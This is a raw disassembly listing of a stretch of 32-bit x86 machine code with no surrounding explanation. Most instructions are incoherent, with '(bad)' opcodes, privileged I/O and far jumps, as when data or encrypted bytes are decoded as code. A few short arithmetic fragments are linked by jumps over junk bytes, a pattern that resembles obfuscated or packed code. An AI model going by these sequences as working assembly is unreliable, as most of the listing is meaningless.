  40cf8c:	sub    al,0xb1
  40cf8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf90:	xor    eax,0x95489483
  40cf95:	out    0x2a,al
  40cf97:	das    
  40cf98:	(bad)  
  40cf99:	repz push ss
  40cf9b:	imul   ebp,DWORD PTR fs:[ecx-0x6ec025af],0xffffffbd
  40cfa3:	dec    edx
  40cfa4:	mov    ah,0xc6
  40cfa6:	or     BYTE PTR cs:[edi],0x9c
  40cfaa:	fisttp WORD PTR [eax-0x4d07dc65]
  40cfb0:	js     0x40d025
  40cfb2:	adc    DWORD PTR [ebx],esi
  40cfb4:	fs (bad) 
  40cfb6:	mov    esi,0xc923c029
  40cfbb:	and    eax,0x181cf05c
  40cfc0:	shr    DWORD PTR [edi+0x1f],1
  40cfc3:	mov    bl,0xd4
  40cfc5:	or     al,0xb
  40cfc7:	and    edi,DWORD PTR [ebx*1-0x16ebdaff]
  40cfce:	cs pop ds
  40cfd0:	jne    0x40d030
  40cfd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfd3:	or     DWORD PTR ds:0xe31f900,esi
  40cfd9:	fist   WORD PTR [ebx-0xd]
  40cfdc:	arpl   WORD PTR [ecx+eiz*1+0x502de969],dx
  40cfe3:	jnp    0x40cff3
  40cfe5:	mov    cs,WORD PTR [ebx+0x1a]
  40cfe8:	xor    ebx,DWORD PTR [eax+edx*1-0x4cd612b]
  40cfef:	cwde   
  40cff0:	push   esp
  40cff1:	into   
  40cff2:	lds    eax,FWORD PTR [ebx]
  40cff4:	mov    ah,0xfb
  40cff6:	jp     0x40d02d
  40cff8:	cmp    al,0x92
  40cffa:	mov    WORD PTR [edi-0x2c],cs
  40cffd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cffe:	nop
  40cfff:	int3   
  40d000:	lods   al,BYTE PTR ds:[esi]
  40d001:	dec    edi
  40d002:	in     al,0x5b
  40d004:	push   esp
  40d005:	rol    DWORD PTR [eax],1
  40d007:	adc    ebx,DWORD PTR [edi+0x595146e6]
  40d00d:	rcl    DWORD PTR ds:[ebx],1
  40d010:	pop    esp
  40d011:	pop    ss
  40d012:	mov    dl,BYTE PTR [ebp+0x2fa40e5b]
  40d018:	push   0x51
  40d01a:	shl    BYTE PTR [ecx+0x63d32c9f],1
  40d020:	mov    ebx,0xc754c5d1
  40d025:	xchg   ebx,eax
  40d026:	test   DWORD PTR [ecx],ecx
  40d028:	and    al,0x63
  40d02a:	add    eax,0x5557eaf5
  40d02f:	test   DWORD PTR [edi],edi
  40d031:	jmp    0x5fa7:0xb00ee53c
  40d038:	push   ecx
  40d039:	and    eax,0x7fbf4ee1
  40d03e:	retfw  0x489c
  40d042:	push   esp
  40d043:	scas   al,BYTE PTR es:[edi]
  40d044:	mov    WORD PTR [ebx],?
  40d046:	xlat   BYTE PTR ds:[ebx]
  40d047:	jbe    0x40d0b1
  40d049:	push   0xef6ac87c
  40d04e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d04f:	xchg   edx,eax
  40d050:	(bad)  
  40d051:	iret   
  40d052:	push   ebx
  40d053:	fidiv  DWORD PTR [edi]
  40d055:	test   BYTE PTR [esi-0x12796c76],ch
  40d05b:	test   al,0x69
  40d05d:	sbb    eax,0x3f812ce2
  40d062:	mov    bh,0x37
  40d064:	push   esi
  40d065:	dec    ebp
  40d066:	xor    BYTE PTR [esi+edx*2+0x5a],dh
  40d06a:	outs   dx,BYTE PTR ds:[esi]
  40d06b:	mov    ebx,ss
  40d06d:	fcmovne st,st(5)
  40d06f:	dec    ebx
  40d070:	mov    edi,edx
  40d072:	loop   0x40d020
  40d074:	cmc    
  40d075:	add    BYTE PTR [ebx-0x63af1317],dh
  40d07b:	in     al,dx
  40d07c:	popa   
  40d07d:	das    
  40d07e:	(bad)  
  40d07f:	jb     0x40d04e
  40d081:	popa   
  40d082:	test   al,0xeb
  40d084:	dec    edx
  40d085:	aaa    
  40d086:	cmp    eax,0x75a1b907
  40d08b:	ins    DWORD PTR es:[edi],dx
  40d08c:	mov    ds:0x17eb07ea,eax
  40d091:	sub    dh,al
  40d093:	jns    0x40d0db
  40d095:	cmp    BYTE PTR [ebp+0x2f0a9d92],ah
  40d09b:	jl     0x40d11a
  40d09d:	add    esp,edx
  40d09f:	mov    cl,0x5f
  40d0a1:	shr    ch,0xda
  40d0a4:	xchg   esp,eax
  40d0a5:	test   eax,0x53e5ad32
  40d0aa:	popf   
  40d0ab:	mov    cr5,ebx
  40d0ae:	aam    0xd4
  40d0b0:	mov    esp,0xdd29bd3d
  40d0b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0b6:	sbb    eax,DWORD PTR [ebp-0x61f9c959]
  40d0bc:	call   0xe9aa1c7
  40d0c1:	sbb    edx,0xffffffce
  40d0c4:	stos   DWORD PTR es:[edi],eax
  40d0c5:	sti    
  40d0c6:	sub    eax,0xa53e048f
  40d0cb:	adc    ebx,DWORD PTR [edi-0x30]
  40d0ce:	xor    dl,cl
  40d0d0:	cmp    eax,0x63ecdba2
  40d0d5:	aam    0x66
  40d0d7:	(bad)  
  40d0d8:	jp     0x40d12d
  40d0da:	xchg   esi,eax
  40d0db:	cmp    ebp,esi
  40d0dd:	leave  
  40d0de:	jne    0x40d083
  40d0e0:	dec    edi
  40d0e1:	sub    BYTE PTR [ecx],dh
  40d0e3:	ds ins DWORD PTR es:[edi],dx
  40d0e5:	test   al,0x25
  40d0e7:	loope  0x40d154
  40d0e9:	cli    
  40d0ea:	cs ds lahf 
  40d0ed:	stc    
  40d0ee:	xor    dh,BYTE PTR [ecx+0x44]
  40d0f1:	icebp  
  40d0f2:	xor    ah,dh
  40d0f4:	dec    ebx
  40d0f5:	pop    esi
  40d0f6:	addr16 inc esp
  40d0f8:	push   esp
  40d0f9:	daa    
  40d0fa:	out    0x6c,al
  40d0fc:	(bad)  
  40d0fd:	push   ecx
  40d0fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0ff:	lock pop ecx
  40d101:	fdivr  QWORD PTR [esi+0x50]
  40d104:	pop    ebx
  40d105:	and    esp,DWORD PTR [eax-0x54]
  40d108:	ret    0x2da2
  40d10b:	repz gs mov ebp,0x59e59088
  40d112:	jae    0x40d0e6
  40d114:	pusha  
  40d115:	lods   eax,DWORD PTR ds:[esi]
  40d116:	imul   edi,DWORD PTR [eax-0x36],0xffffffd6
  40d11a:	xor    DWORD PTR [edx+esi*8+0x12],esi
  40d11e:	inc    edi
  40d11f:	jge    0x40d131
  40d121:	mov    ds:0x72898184,eax
  40d126:	jmp    0xcde9:0x3c67209f
  40d12d:	imul   ecx,DWORD PTR [edi+0x3c],0x538f2e24
  40d134:	das    
  40d135:	sub    eax,0x28e76ca4
  40d13a:	inc    edi
  40d13b:	sub    DWORD PTR [edx+0x1ef982a9],0x4aed4967
  40d145:	(bad)  
  40d146:	pusha  
  40d147:	(bad)  
  40d148:	clc    
  40d149:	cmc    
  40d14a:	outs   dx,DWORD PTR ds:[esi]
  40d14b:	ss int 0xab
  40d14e:	and    ebx,DWORD PTR [edx]
  40d150:	(bad)  
  40d153:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d154:	sub    esp,eax
  40d156:	jne    0x40d113
  40d158:	stos   BYTE PTR es:[edi],al
  40d159:	aas    
  40d15a:	leave  
  40d15b:	adc    DWORD PTR [edi],eax
  40d15d:	push   ds
  40d15e:	inc    esp
  40d15f:	pop    esp
  40d160:	into   
  40d161:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d162:	mov    dl,BYTE PTR cs:[edi-0x28]
  40d166:	cmp    BYTE PTR [ebp+0x6e7d9782],cl
  40d16c:	pop    ebx
  40d16d:	mov    esi,0x114341
  40d172:	mov    ds:0xe345c1fb,al
  40d177:	test   ah,ch
  40d179:	add    esp,DWORD PTR [eax+0x598c3128]
  40d17f:	jmp    0x152a:0x87817c83
  40d186:	push   es
  40d187:	sbb    BYTE PTR [esi-0x35],al
  40d18a:	dec    ebx
  40d18b:	xor    ebx,esi
  40d18d:	pop    edi
  40d18e:	shl    ch,cl
  40d190:	std    
  40d191:	jbe    0x40d152
  40d193:	cmp    BYTE PTR [esi-0x28c5973a],al
  40d199:	pop    eax
  40d19a:	stos   BYTE PTR es:[edi],al
  40d19b:	(bad)  
  40d19c:	push   edx
  40d19d:	or     edx,DWORD PTR [edi-0x36]
  40d1a0:	cld    
  40d1a1:	mov    ds:0x3528d867,eax
  40d1a6:	mov    ebp,0xe66ca456
  40d1ab:	mov    ch,0xf2
  40d1ad:	hlt    
  40d1ae:	popa   
  40d1af:	inc    ebp
  40d1b0:	push   eax
  40d1b1:	stos   DWORD PTR es:[edi],eax
  40d1b2:	(bad)  [edx-0x43c886cf]
  40d1b8:	dec    ebx
  40d1b9:	popf   
  40d1ba:	sti    
  40d1bb:	mov    esi,0xaa716dfa
  40d1c0:	sti    
  40d1c1:	out    0x71,al
  40d1c3:	fmul   QWORD PTR [ecx-0x37ea42d1]
  40d1c9:	test   eax,0x9efa5939
  40d1ce:	retf   0x7cae
  40d1d1:	adc    ecx,ebx
  40d1d3:	jbe    0x40d17c
  40d1d5:	repnz es stos DWORD PTR es:[edi],eax
  40d1d8:	sbb    al,0x42
  40d1da:	pop    ds
  40d1db:	dec    edx
  40d1dc:	das    
  40d1dd:	cmp    DWORD PTR [ebp-0x2efc2fcd],eax
  40d1e3:	imul   edx,edi
  40d1e6:	mov    edi,DWORD PTR [ebp-0xc]
  40d1e9:	xor    edi,eax
  40d1eb:	sub    edx,edi
  40d1ed:	mov    edi,DWORD PTR [ebp-0xc]
  40d1f0:	mov    ebx,DWORD PTR [ebp-0x14]
  40d1f3:	xor    edi,eax
  40d1f5:	add    edi,ecx
  40d1f7:	imul   edi,ebx
  40d1fa:	mov    ebx,DWORD PTR [ebp-0x18]
  40d1fd:	jmp    0x40d614
  40d202:	pop    esi
  40d203:	in     al,0x48
  40d205:	add    BYTE PTR [esp+edi*4+0x76],dl
  40d209:	ins    BYTE PTR es:[edi],dx
  40d20a:	xor    edx,DWORD PTR [ecx]
  40d20c:	fcmovb st,st(2)
  40d20e:	test   DWORD PTR [esi-0x3e],eax
  40d211:	gs (bad) 
  40d213:	call   0x7e7e:0x79707e7e
  40d21a:	or     cl,BYTE PTR [edi]
  40d21c:	repz add BYTE PTR [esi-0x7d9b2ede],dh
  40d223:	dec    ebp
  40d224:	fadd   st,st(2)
  40d226:	scas   al,BYTE PTR es:[edi]
  40d227:	leave  
  40d228:	pop    ebp
  40d229:	in     al,dx
  40d22a:	jmp    0x611:0x85d5a93b
  40d231:	push   edx
  40d232:	sbb    cl,bl
  40d234:	fsubr  DWORD PTR [edx-0x5a10cf3b]
  40d23a:	or     DWORD PTR [eax],edx
  40d23c:	push   0xd2bafbff
  40d241:	mov    DWORD PTR [eax],ebx
  40d243:	inc    ebx
  40d244:	dec    ebx
  40d245:	(bad)  
  40d246:	bound  edx,QWORD PTR [edx+0x1e]
  40d249:	push   ds
  40d24a:	jp     0x40d29e
  40d24c:	(bad)  
  40d24d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d24e:	add    al,BYTE PTR [edi+edx*8]
  40d251:	fst    DWORD PTR [esi+eax*1-0x30]
  40d255:	test   BYTE PTR [eax+0x429cd07a],bl
  40d25b:	inc    eax
  40d25c:	bound  edx,QWORD PTR [ebx]
  40d25e:	arpl   WORD PTR [edx+eax*2],si
  40d261:	retf   
  40d262:	pop    esp
  40d263:	bound  edx,QWORD PTR [esi-0x2e]
  40d266:	frstor [esi+0x16d58ee7]
  40d26c:	ins    DWORD PTR es:[edi],dx
  40d26d:	pop    edx
  40d26e:	push   0xffffffa7
  40d270:	mov    ecx,0xf83c98b1
  40d275:	iret   
  40d276:	sub    eax,0xb079e7db
  40d27b:	xlat   BYTE PTR ds:[ebx]
  40d27c:	pop    edi
  40d27d:	adc    eax,0x94d96262
  40d282:	sub    DWORD PTR [edi],edi
  40d284:	in     eax,0xa1
  40d286:	cmp    esi,esp
  40d288:	scas   eax,DWORD PTR es:[edi]
  40d289:	mov    ah,0x1
  40d28b:	lods   eax,DWORD PTR ds:[esi]
  40d28c:	pop    es
  40d28d:	xor    BYTE PTR [ebp+edx*1-0x6c],cl
  40d291:	loope  0x40d2c5
  40d293:	arpl   WORD PTR [edi],cx
  40d295:	inc    edx
  40d296:	iret   
  40d297:	ins    DWORD PTR es:[edi],dx
  40d298:	ins    BYTE PTR es:[edi],dx
  40d299:	adc    al,0x71
  40d29b:	lods   eax,DWORD PTR ds:[esi]
  40d29c:	sbb    BYTE PTR [ecx+0x24349fa3],al
  40d2a2:	lea    esp,[ebp+0x6e64a521]
  40d2a8:	aas    
  40d2a9:	add    eax,0xf35917a1
  40d2ae:	test   eax,0x1cbd69f2
  40d2b3:	pop    esi
  40d2b4:	mov    esi,es
  40d2b6:	or     DWORD PTR [ebp+0x400262da],ecx
  40d2bc:	ins    DWORD PTR es:[edi],dx
  40d2bd:	sub    al,0xe4
  40d2bf:	xor    eax,0x3f7a41aa
  40d2c4:	in     al,dx
  40d2c5:	mov    esp,0x38d9acfc
  40d2ca:	pop    esi
  40d2cb:	pop    ss
  40d2cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2cd:	pop    edx
  40d2ce:	push   DWORD PTR [ebx-0x48]
  40d2d1:	loope  0x40d2f5
  40d2d3:	sbb    ebx,DWORD PTR [esi-0x2729224c]
  40d2d9:	js     0x40d333
  40d2db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2dc:	fist   WORD PTR [ebp-0x4d4239b8]
  40d2e2:	mov    ecx,cr1
  40d2e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2e6:	(bad)  
  40d2e7:	out    dx,eax
  40d2e8:	jbe    0x40d2e2
  40d2ea:	imul   ebp,DWORD PTR [ecx],0xbe01853f
  40d2f0:	ds mov ah,0xe2
  40d2f3:	fisub  WORD PTR [eax-0x2a]
  40d2f6:	pop    ds
  40d2f7:	fadd   st(6),st
  40d2f9:	js     0x40d35c
  40d2fb:	jl     0x40d318
  40d2fd:	jl     0x40d360
  40d2ff:	mov    eax,0xa3e352fd
  40d304:	fistp  WORD PTR [esi-0x5f]
  40d307:	clc    
  40d308:	mov    ds:0xb3dbf16b,al
  40d30d:	adc    dl,dl
  40d30f:	adc    al,ah
  40d311:	dec    BYTE PTR [esi+0x35]
  40d314:	sbb    al,BYTE PTR [ebx-0x45]
  40d317:	jns    0x40d30d
  40d319:	mov    dh,0x13
  40d31b:	out    dx,al
  40d31c:	sub    cl,bl
  40d31e:	hlt    
  40d31f:	cdq    
  40d320:	ret    
  40d321:	mov    eax,0xf914bd71
  40d326:	popf   
  40d327:	push   0x47
  40d329:	cmp    BYTE PTR [esi],bl
  40d32b:	pop    ds
  40d32c:	pop    es
  40d32d:	ins    BYTE PTR es:[edi],dx
  40d32e:	pushf  
  40d32f:	lods   eax,DWORD PTR ds:[esi]
  40d330:	mov    esp,0x7539df7f
  40d335:	btc    edi,esp
  40d338:	in     al,dx
  40d339:	pop    es
  40d33a:	and    dh,bl
  40d33c:	jecxz  0x40d344
  40d33e:	pop    esp
  40d33f:	xor    al,0xfc
  40d341:	fdiv   DWORD PTR [esi-0x28]
  40d344:	mov    ch,0x11
  40d346:	cwde   
  40d347:	mov    cs,WORD PTR [eax-0x23689cff]
  40d34d:	shr    BYTE PTR [ebx+0x7350d19d],0xfa
  40d354:	loop   0x40d330
  40d356:	pop    ecx
  40d357:	jp     0x40d343
  40d359:	data16 std 
  40d35b:	(bad)  
  40d35c:	jno    0x40d33e
  40d35e:	or     eax,DWORD PTR [esp+eiz*4-0x7e]
  40d362:	retf   
  40d363:	sub    ecx,edi
  40d365:	scas   eax,DWORD PTR es:[edi]
  40d366:	call   0x7497:0x6bc7ad5
  40d36d:	xchg   edi,eax
  40d36e:	fdiv   DWORD PTR [edx]
  40d370:	xchg   ebx,eax
  40d371:	dec    ecx
  40d372:	pusha  
  40d373:	inc    edx
  40d374:	jno    0x40d2fc
  40d376:	ss cld 
  40d378:	aaa    
  40d379:	test   BYTE PTR [edx],cl
  40d37b:	leave  
  40d37c:	fdiv   QWORD PTR ds:0xf3a7
  40d381:	push   esi
  40d382:	int3   
  40d383:	add    DWORD PTR [edx],ebp
  40d385:	dec    eax
  40d386:	dec    edi
  40d387:	retf   0xb264
  40d38a:	push   eax
  40d38b:	iret   
  40d38c:	stos   BYTE PTR es:[edi],al
  40d38d:	in     eax,dx
  40d38e:	pop    ss
  40d38f:	adc    al,0x2c
  40d391:	pop    ds
  40d392:	pushf  
  40d393:	in     eax,0xd4
  40d395:	mov    ds:0x9c058d7d,eax
  40d39a:	retf   
  40d39b:	retf   0xa151
  40d39e:	aad    0xde
  40d3a0:	xor    DWORD PTR [eax+0x1],esi
  40d3a3:	jns    0x40d3a1
  40d3a5:	adc    BYTE PTR ds:0x2a6ad90c,bl
  40d3ab:	iret   
  40d3ac:	dec    esp
  40d3ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3ae:	mov    ah,BYTE PTR ds:[edx]
  40d3b1:	mov    bh,0xd5
  40d3b3:	adc    al,0x97
  40d3b5:	ret    0xb6d9
  40d3b8:	fs pop esp
  40d3ba:	std    
  40d3bb:	adc    BYTE PTR [ebp-0x382cdcb4],bl
  40d3c1:	mov    al,0xf
  40d3c3:	imul   ecx,DWORD PTR [edi+esi*2+0xa],0x396f45ee
  40d3cb:	xchg   ebp,eax
  40d3cc:	into   
  40d3cd:	out    dx,eax
  40d3ce:	mov    ebx,0x38b9d510
  40d3d3:	add    esp,DWORD PTR [eax+edi*1-0x13]
  40d3d7:	scas   eax,DWORD PTR es:[edi]
  40d3d8:	arpl   dx,cx
  40d3da:	push   0x43
  40d3dc:	inc    esp
  40d3dd:	jae    0x40d3b6
  40d3df:	test   DWORD PTR [edi],eax
  40d3e1:	pop    ebp
  40d3e2:	mov    ebx,0x2b65db96
  40d3e7:	retf   
  40d3e8:	shl    BYTE PTR ds:0x6ffc5c5b,1
  40d3ee:	in     al,0xf0
  40d3f0:	add    DWORD PTR [esi+0x4b],ebp
  40d3f3:	lea    esi,[esp+esi*4-0x72]
  40d3f7:	and    dl,BYTE PTR [esi+eiz*1]
  40d3fa:	mov    bh,0x83
  40d3fc:	std    
  40d3fd:	push   0xd4340285
  40d402:	ret    
  40d403:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d404:	std    
  40d405:	adc    ecx,DWORD PTR [esi]
  40d407:	inc    ebp
  40d408:	aaa    
  40d409:	dec    ebp
  40d40a:	out    dx,eax
  40d40b:	push   ss
  40d40c:	xor    BYTE PTR [ebx-0x22360d7a],al
  40d412:	ret    
  40d413:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d414:	adc    dh,BYTE PTR [esi]
  40d416:	retf   0xb5d4
  40d419:	jbe    0x40d3e9
  40d41b:	push   es
  40d41c:	fisttp WORD PTR ds:0x7915ab6a
  40d422:	test   eax,0xa42ca0a5
  40d427:	sbb    ch,BYTE PTR [ecx]
  40d429:	je     0x40d3ab
  40d42b:	rcr    DWORD PTR [edx+0x62],0x0
  40d42f:	push   es
  40d430:	inc    ecx
  40d431:	mov    al,0xd9
  40d433:	lahf   
  40d434:	push   esi
  40d435:	jecxz  0x40d41c
  40d437:	fs icebp 
  40d439:	mov    ch,0x72
  40d43b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d43c:	xchg   BYTE PTR [ecx+0x6d7b6539],dh
  40d442:	enter  0xfd56,0x2e
  40d446:	imul   eax,DWORD PTR ds:0xf301df00,0x4c
  40d44d:	fst    QWORD PTR [eax-0x1dadf399]
  40d453:	je     0x40d48d
  40d455:	and    al,0x1
  40d457:	pop    ecx
  40d458:	call   0x90e1:0xfe870d6b
  40d45f:	pusha  
  40d460:	(bad)  
  40d461:	inc    edx
  40d462:	pop    esi
  40d463:	out    dx,eax
  40d464:	sahf   
  40d465:	shl    DWORD PTR ds:0x4fbad35,1
  40d46b:	popf   
  40d46c:	popf   
  40d46d:	sbb    ebx,edi
  40d46f:	jecxz  0x40d4dc
  40d471:	ret    0xea99
  40d474:	mov    cl,0xe3
  40d476:	pushf  
  40d477:	test   DWORD PTR [ecx-0x49],eax
  40d47a:	ds iret 
  40d47c:	enter  0xa5e6,0xe7
  40d480:	xchg   edx,eax
  40d481:	test   DWORD PTR [edx],esi
  40d483:	mov    ah,0xa4
  40d485:	lock push ebp
  40d487:	mov    edx,DWORD PTR [edi-0x3d7e8e40]
  40d48d:	push   cs
  40d48e:	mov    bl,0x13
  40d490:	jmp    0x40d431
  40d492:	inc    esi
  40d493:	jnp    0x40d41c
  40d495:	push   0x33b9d9
  40d49a:	push   ss
  40d49b:	mov    eax,gs:0xd5490898
  40d4a1:	fld    DWORD PTR ds:[ebp+0x6f6b00f0]
  40d4a8:	mov    al,0x82
  40d4aa:	out    0x3a,eax
  40d4ac:	ja     0x40d459
  40d4ae:	xchg   al,ch
  40d4b0:	cmp    eax,0xbf22611a
  40d4b5:	xor    eax,eax
  40d4b7:	stos   BYTE PTR es:[edi],al
  40d4b8:	xchg   edi,eax
  40d4b9:	sbb    esi,DWORD PTR [ecx]
  40d4bb:	shl    BYTE PTR [ebx-0x6398878],cl
  40d4c1:	ins    DWORD PTR es:[edi],dx
  40d4c2:	les    edx,FWORD PTR [esi+0x4c5750e0]
  40d4c8:	xor    al,0x31
  40d4ca:	add    DWORD PTR [esp+eiz*2-0x51],ebx
  40d4ce:	and    al,0xa4
  40d4d0:	xchg   esi,eax
  40d4d1:	repnz out dx,al
  40d4d3:	ret    
  40d4d4:	or     edx,edx
  40d4d6:	and    al,0x4d
  40d4d8:	adc    bh,BYTE PTR [ebx-0x5f]
  40d4db:	add    edx,DWORD PTR [edx]
  40d4dd:	adc    bl,BYTE PTR [ebx-0x3f67f27d]
  40d4e3:	xor    DWORD PTR [ebx],0xfe725bf4
  40d4e9:	mov    eax,?
  40d4eb:	mov    ah,0x5f
  40d4ed:	jo     0x40d4d6
  40d4ef:	sar    BYTE PTR [eax+0x51],cl
  40d4f2:	fwait
  40d4f3:	out    dx,eax
  40d4f4:	std    
  40d4f5:	mov    edi,0x95039b1b
  40d4fa:	add    ebp,DWORD PTR [esi+0x1b]
  40d4fd:	test   bl,0x5b
  40d500:	js     0x40d512
  40d502:	xor    al,0xaf
  40d504:	fwait
  40d505:	std    
  40d506:	iret   
  40d507:	and    bl,0x99
  40d50a:	adc    al,0x76
  40d50c:	sub    dl,al
  40d50e:	and    cl,ch
  40d510:	xor    eax,0x11e7460a
  40d515:	adc    DWORD PTR [bp+si],0x74
  40d519:	xor    dh,BYTE PTR [ecx+0x70d4772]
  40d51f:	jns    0x40d526
  40d521:	or     ch,BYTE PTR [edi+0x2af1fdf2]
  40d527:	pop    ecx
  40d528:	das    
  40d529:	popa   
  40d52a:	sbb    DWORD PTR [eax-0x5889c65e],ebx
  40d530:	mov    al,0x90
  40d532:	hlt    
  40d533:	in     al,dx
  40d534:	inc    eax
  40d535:	int3   
  40d536:	or     bl,bl
  40d538:	addr16 push ds
  40d53a:	xor    DWORD PTR [esi+0x7f34329a],ecx
  40d540:	fwait
  40d541:	sbb    BYTE PTR [eax-0x3a],0x3c
  40d545:	push   es
  40d546:	outs   dx,BYTE PTR ds:[esi]
  40d547:	mul    DWORD PTR [eax+0x61c884aa]
  40d54d:	sbb    dl,0x86
  40d550:	lods   eax,DWORD PTR ds:[esi]
  40d551:	cdq    
  40d552:	ja     0x40d540
  40d554:	add    al,0x49
  40d556:	rol    DWORD PTR [eax+eiz*8-0x37e3c2c],cl
  40d55d:	stos   BYTE PTR es:[edi],al
  40d55e:	jno    0x40d4fb
  40d560:	or     DWORD PTR [ebx],edi
  40d562:	sub    BYTE PTR [edx+0x177ced84],0x79
  40d569:	leave  
  40d56a:	cld    
  40d56b:	mov    edx,0x2be36b45
  40d570:	stos   BYTE PTR es:[edi],al
  40d571:	test   al,0xd5
  40d573:	sub    al,0x32
  40d575:	ja     0x40d544
  40d577:	out    0xc9,al
  40d579:	add    ebp,DWORD PTR [eax+0x4d3d6c4d]
  40d57f:	(bad)  [eax-0x11]
  40d582:	inc    ebp
  40d583:	xchg   DWORD PTR [ebx],ebp
  40d585:	add    al,0x90
  40d587:	cld    
  40d588:	xor    eax,0x68f46883
  40d58d:	inc    edx
  40d58e:	idiv   DWORD PTR [esi-0x66a6b5fe]
  40d594:	repz inc edx
  40d596:	mov    cl,0x9a
  40d598:	or     cl,BYTE PTR [edx+0x3e]
  40d59b:	shr    BYTE PTR [esi-0x3d],1
  40d59e:	outs   dx,DWORD PTR ds:[esi]
  40d59f:	jno    0x40d56c
  40d5a1:	out    dx,al
  40d5a2:	pop    ds
  40d5a3:	mov    eax,esi
  40d5a5:	clc    
  40d5a6:	pop    ss
  40d5a7:	pop    ecx
  40d5a8:	rcr    ah,1
  40d5aa:	not    DWORD PTR [edx-0x742547d3]
  40d5b0:	stc    
  40d5b1:	sahf   
  40d5b2:	js     0x40d5e8
  40d5b4:	int    0xc
  40d5b6:	adc    DWORD PTR [ebp*8-0x57a1f860],edi
  40d5bd:	sbb    edx,DWORD PTR [eax+0x79]
  40d5c0:	bound  ebp,QWORD PTR [ebx+0x1de09e22]
  40d5c6:	push   ebx
  40d5c7:	scas   al,BYTE PTR es:[edi]
  40d5c8:	out    0xbb,al
  40d5ca:	mov    al,0xe1
  40d5cc:	imul   ebp,edi,0x1f
  40d5cf:	pop    edi
  40d5d0:	stos   DWORD PTR es:[edi],eax
  40d5d1:	outs   dx,BYTE PTR ds:[esi]
  40d5d2:	xchg   esp,eax
  40d5d3:	or     al,0x79
  40d5d5:	jmp    0x9ca59103
  40d5da:	push   eax
  40d5db:	xor    BYTE PTR [edi+0x3],0x24
  40d5df:	cmp    eax,0x425033aa
  40d5e4:	daa    
  40d5e5:	xor    DWORD PTR [esi+0x3e],ebx
  40d5e8:	jecxz  0x40d5ca
  40d5ea:	ds and al,0xb6
  40d5ed:	rol    ch,0x15
  40d5f0:	jbe    0x40d60d
  40d5f2:	lock ror BYTE PTR [edi+0x70499d26],0x6c
  40d5fa:	or     ebx,ecx
  40d5fc:	(bad)  
  40d5fd:	xchg   edi,eax
  40d5fe:	gs ins BYTE PTR es:[edi],dx
  40d600:	mov    eax,0xfc5da204
  40d605:	imul   eax,ebx,0xffffff8c
  40d608:	stos   BYTE PTR es:[edi],al
  40d609:	imul   ebp,DWORD PTR [edi-0x164aa4d7],0xffffff97
  40d610:	sti    
  40d611:	push   ss
  40d612:	movd   DWORD PTR [ebx],mm6
  40d615:	fsubr  DWORD PTR [ebx]
  40d617:	ror    DWORD PTR [ebp+0x72991fbc],1
  40d61d:	xor    al,BYTE PTR [eax]
  40d61f:	cmp    edi,edx
  40d621:	jbe    0x40c529
  40d627:	mov    edx,DWORD PTR [ebp-0xc]
  40d62a:	mov    edi,DWORD PTR [ebp-0x24]
  40d62d:	xor    edx,eax
  40d62f:	add    edx,ecx
  40d631:	imul   edx,edi
  40d634:	mov    edi,DWORD PTR [ebp-0x18]
  40d637:	jmp    0x40da4e
  40d63c:	(bad)  
  40d63d:	pusha  
  40d63e:	jecxz  0x40d614
  40d640:	jge    0x40d697
  40d642:	icebp  
  40d643:	ins    BYTE PTR es:[edi],dx
  40d644:	(bad)  
  40d645:	fwait
  40d646:	mov    edi,0xb34b9198
  40d64b:	pop    es
  40d64c:	cmp    BYTE PTR [esi+0x79707e7e],ah
  40d652:	jle    0x40d6d2
  40d654:	sub    eax,0x9bcee216
  40d659:	retf   
  40d65a:	(bad)  
  40d65b:	jmp    0xef07:0xbef84d2f
  40d662:	(bad)  
  40d663:	cmp    BYTE PTR [ebp+0x46],ch
  40d666:	fist   WORD PTR [edx+0x5e154937]
  40d66c:	rcr    BYTE PTR [edi+0x6],cl
  40d66f:	push   esp
  40d670:	clc    
  40d671:	add    edi,DWORD PTR [edi*8+0x2a7b0f16]
  40d678:	jmp    0x71fc:0x2a7078ee
  40d67f:	leave  
  40d680:	inc    ebp
  40d681:	pop    ss
  40d682:	inc    esi
  40d683:	fcomi  st,st(4)
  40d685:	mov    dl,0xc1
  40d687:	mov    esp,0xa1b6a809
  40d68c:	js     0x40d690
  40d68e:	pop    ebx
  40d68f:	push   edx
  40d690:	add    DWORD PTR [eax+ebp*1+0x38b731d5],ebx
  40d697:	call   0xea9b:0xa5e178c9
  40d69e:	out    0xd6,al
  40d6a0:	push   cs
  40d6a1:	dec    ebx
  40d6a2:	pop    esi
  40d6a3:	out    0x59,al
  40d6a5:	fidiv  DWORD PTR [esi]
  40d6a7:	jp     0x40d704
  40d6a9:	and    ch,BYTE PTR [edx-0x58]
  40d6ac:	xor    DWORD PTR [ecx-0x5a0f02d2],eax
  40d6b2:	pop    ds
  40d6b3:	mov    dh,0xf3
  40d6b6:	jmp    0x40d714
  40d6b8:	(bad)
  40d6bc:	sub    DWORD PTR [edx*2-0x7fd3f082],edx
  40d6c3:	and    eax,0xcd093d6b
  40d6c8:	mul    BYTE PTR [edx-0x57fd2e84]
  40d6ce:	dec    esp
  40d6cf:	and    esp,ecx
  40d6d1:	adc    bl,BYTE PTR [bx+si+0x3f]
  40d6d5:	mov    ah,0x2b
  40d6d7:	or     eax,0xc691fc3c
  40d6dc:	push   es
  40d6dd:	out    0x80,eax
  40d6df:	stos   DWORD PTR es:[edi],eax
  40d6e0:	mov    DWORD PTR [esi-0x3d],edi
  40d6e3:	push   0x4
  40d6e5:	mov    ebx,0x6fa22621
  40d6ea:	push   esp
